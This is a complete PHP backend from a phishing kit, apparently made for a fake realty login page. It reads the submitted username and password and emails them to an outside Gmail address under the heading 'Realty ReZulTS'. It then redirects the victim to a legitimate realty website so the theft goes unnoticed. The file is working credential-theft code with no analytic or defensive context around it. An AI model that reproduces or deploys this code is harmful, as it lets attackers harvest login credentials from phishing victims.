<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Realty ReZulTS-----------------------\n";
$message .= "Username ".$_POST['user_name']."\n";
$message .= "Password ".$_POST['password']."\n";
$message .= "---------------Created By SOJ~~---------------------\n";
$recipient = "logsbox2016@gmail.com";
$subject = "Realty ReZulTS";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "MON ReZulTS", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.realtyusa.com/listmailer/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>